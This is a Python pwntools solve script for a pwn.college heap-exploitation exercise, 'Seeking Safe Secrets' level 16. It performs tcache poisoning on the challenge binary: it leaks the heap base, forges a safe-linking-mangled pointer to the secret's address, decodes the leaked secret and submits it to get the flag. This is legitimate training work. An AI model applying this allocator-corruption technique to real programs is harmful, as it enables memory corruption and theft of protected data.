# Dynamic Allocator Misuse - Seeking Safe Secrets (Easy)
# https://pwn.college/program-security/dynamic-allocator-misuse/level-16-0
import pwn
from dojotool import find_challenge, protect_ptr
from dojotool.pwntool import tee


def one_round(io: pwn.process):
    tee(io)

    if io.recvuntil(b"stored at ", timeout=1):
        secret_addr = int(io.recvuntil(b".", True), 16)
        pwn.success(f"secret_addr: {hex(secret_addr)}")
    else:
        secret_addr = 0x425F60  # seeking-safe-secrets-hard

    def read_byte(idx):
        io.sendline(b"puts %d" % idx)
        io.recvuntil(b"Data: ")
        return pwn.u64(io.recvline(False).ljust(8, b"\x00")[:8])

    def scanf(idx, data):
        io.sendline(b"scanf %d" % idx)
        io.sendline(data)

    io.sendline(b"malloc 0 16")
    io.sendline(b"malloc 1 16")
    io.sendline(b"free 1")
    io.sendline(b"free 0")
    heap = read_byte(1) << 12  # last 12 bits is unknown, but irrelevant
    secret_mangled = protect_ptr(heap, secret_addr)
    scanf(0, pwn.p64(secret_mangled))  # 把要访问的地址编码后写入
    io.sendline(b"malloc 0 16")
    io.sendline(b"malloc 1 16")  # will be discard
    io.sendline(b"free 0")

    mangled = read_byte(0)
    secret1 = protect_ptr(heap, mangled)  # 是个 heap 上的地址
    secret1 = protect_ptr(secret_addr, secret1)  # 是个 bss 上的地址
    secret1 = pwn.p64(secret1)
    secret2 = pwn.p64(0)  # key will be zeroed

    io.sendline(b"send_flag")
    io.sendline(secret1 + secret2)
    io.sendline(b"quit")


def ctf():
    root_bin = find_challenge()
    with pwn.process(root_bin, raw=True, level="error") as io:
        try:
            one_round(io)
            io.recvrepeat()
        except Exception:
            io.recvrepeat(0.5)
            raise


if __name__ == "__main__":
    ctf()
